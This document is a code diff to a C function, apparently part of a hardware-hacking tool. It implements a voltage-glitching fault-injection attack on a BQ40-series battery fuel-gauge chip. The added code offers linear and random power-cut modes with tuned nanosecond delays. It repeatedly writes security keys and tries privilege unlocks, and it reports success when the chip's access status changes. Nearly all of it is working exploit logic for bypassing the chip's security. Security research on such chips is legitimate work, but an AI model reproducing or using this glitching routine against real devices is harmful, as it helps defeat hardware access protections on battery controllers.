@@ -381,92 +381,135 @@ void device_hack_auto(int fd, struct args* config, uint32_t res_u, uint32_t res_
 	}
 	printf("Voltage control initialized\n");
 
-	
+	printf("Exploit execution modes:\n");
+	printf("  [0] Incremental mode - linearly increases the delay before cutting power\n");
+	printf("  [1] Random mode - randomly picks intervals\n");
+	printf("Choose the desired mode [0]: ");
+	fflush(stdout);
+	if (read(0, buf, 8) <= 0 || (buf[0] != '\n' && buf[0] != '0' && buf[0] != '1'))
+	{
+		printf("Aborting...\n");
+		quit(fd, 1);
+	}
+	int mode = buf[0] == '\n' ? 0 : (buf[0] - '0');
+
+	// Checking previous status
+	voltage_ctrl_set(1);
+	struct operation_status status_old, status;
+
+	switch(config->chip)
+	{
+		case BQ40:
+			if (bq40_get_operation_status(&status_old, fd, config) != 0)
+			{
+				printf("device_hack_auto() : failed to get initial status\n");
+				quit(fd, 1);
+			}
+			break;
+		default:
+			quit(fd, 1);
+	}
+
 
 	printf("Exploit init complete\n");
-	static int exploit_iter = 10000;
-	printf("Running each mode at %d iterations...\n", exploit_iter);
+	static int exploit_iter = 1000000, exploit_step = 50;
+	printf("Running each mode at %d iterations with %d steps per try (%d unique tests total)...\n", exploit_iter, exploit_step, exploit_iter / exploit_step);
 	fflush(stdout);
 
-	int shutoff_delay_us = 0, reset_delay_us = 1000*1000, poweron_delay_us = 1000*500;
+	int one_cycle_ns = 60; // for bq40zxy
+	int reset_delay_us = 100*1000, poweron_delay_us = 1000*100;
+	struct timespec shutoff_delay = {
+		0, 4200 // Empirical result
+	};
 
-	for (int mode = 1; mode < 2; mode++)
+
+	for (int i = 0; i < exploit_iter; i++)
 	{
-		int errors_last[] = {0, 0, 0, 0, 0};
-		static int errors_n = sizeof(errors_last) / sizeof(int);
-		int errors_count = 0;
-		for (int i = 0; i < exploit_iter; i++)
+		// Get a random interval with voltage: ***___***
+		// We need to move this logic HERE to avoid any delay
+		int start = rand() % (2000 + 1);
+		int end = rand() % (3000 + 1);
+		int tail = rand() % (10000 + 1);
+
+
+		switch(config->chip)
 		{
-			// Get a random interval with voltage: ***___***
-			// We need to move this logic HERE to avoid any delay
-			int start = rand() % (2000 + 1);
-			int end = rand() % (3000 + 1);
-			int tail = rand() % (10000 + 1);
-			
-			
-			switch(config->chip)
-			{
-				case BQ40:
-					// Calculate sliding window
-					errors_count -= errors_last[errors_n - 1];
-					memmove(errors_last + 1, errors_last, errors_n - 1);
-					
-					if (bq40_write_security_keys(fd, res_u, res_fa, config) != 0)
-					{
-						errors_last[0] = 1;
-						errors_count += 1;
-					} else {
-						printf("    OK\n");
-						errors_last[0] = 0;
-					}
-					
-					break;
-				default:
-					quit(fd, 1);
-			}
-
-			// Voltage glitching
-			
-			switch(mode)
-			{
-				case 0: // Plain shutoff
+			case BQ40:
+				if (unlikely(bq40_write_security_keys(fd, res_u, res_fa, config) != 0))
 				{
-					usleep(shutoff_delay_us);
-					voltage_ctrl_set(0);
-					usleep(1000); // Discharge
-					voltage_ctrl_set(1);
-					usleep(poweron_delay_us); // Let the chip power on before sending more commands
-
-					// Update variables
-					if (errors_count > errors_n / 2 + 1) // threshold
-						poweron_delay_us += 500;
-
-					if (i % 1000 == 0)
-					{
-						shutoff_delay_us += 100;
-					}
-					break;
+					printf("cannot write word, the chip did not reset completely. Increasing the delay (%d -> %d)\n", reset_delay_us, reset_delay_us + 1000*10);
+					reset_delay_us += 1000*10;
+					usleep(reset_delay_us);
+					continue;
 				}
-				case 1: // Random spikes
-				{
-					usleep(start);
-					voltage_ctrl_set(0);
-					usleep(end);
-					voltage_ctrl_set(1);
-					usleep(tail);
-
-					// Make a full reset
-					voltage_ctrl_set(0);
-					usleep(reset_delay_us); // full reset
-					voltage_ctrl_set(1);
-					usleep(poweron_delay_us); // wake up
-
-					break;
-				}
-			}
+				break;
+			default:
+				quit(fd, 1);
 		}
-		printf("  SWITCHING TO THE NEXT EXPLOIT MODE\n");
+
+		// Voltage glitching
+
+		switch(mode)
+		{
+			case 0: // Linear shutoff
+				if (shutoff_delay.tv_nsec != 0)
+					nanosleep(&shutoff_delay, NULL); // We don't want to waste any cycles
+				voltage_ctrl_set(0);
+				// End of critical section
+
+				usleep(reset_delay_us); // Discharge
+				voltage_ctrl_set(1);
+				usleep(poweron_delay_us); // Let the chip power on before sending more commands
+
+				if ((i + 1) % exploit_step == 0) // We need to increase it 
+				{
+					shutoff_delay.tv_nsec += one_cycle_ns;
+				}
+				break;
+			case 1: // Random spikes
+				usleep(start);
+				voltage_ctrl_set(0);
+				usleep(end);
+				voltage_ctrl_set(1);
+				usleep(tail);
+
+				// Make a full reset
+				voltage_ctrl_set(0);
+				usleep(reset_delay_us); // full reset
+				voltage_ctrl_set(1);
+				usleep(poweron_delay_us); // wake up
+
+				break;
+		}
+
+		switch(config->chip)
+		{
+			case BQ40:
+				// Attempt to set the new key and check status
+				if (bq40_unlock_priviledges(res_u, fd, config) != 0 || bq40_get_operation_status(&status, fd, config) != 0)
+				{
+					printf("cannot check chip status, the device did not reset properly. Increasing the delay (%d -> %d)\n", reset_delay_us, reset_delay_us + 1000*10);
+					reset_delay_us += 1000*10;
+					usleep(reset_delay_us);
+				} else {
+					if (status.access != status_old.access)
+					{
+						printf("SUCCESS !!\n");
+						printf("[%d/%d] (retry %d/%d) timings: shutoff delay : %ld ns\n", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec);
+						voltage_ctrl_close();
+						quit(fd, 1);
+					}
+					usleep(1000*4); // 4 ms
+				}
+				break;
+			default:
+				quit(fd, 1);
+		}
+		printf("\r[%d/%d] (retry %d/%d) shutoff delay : %ld ns...", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec);
+		fflush(stdout);
 	}
+
+	voltage_ctrl_close();
 }
 
 
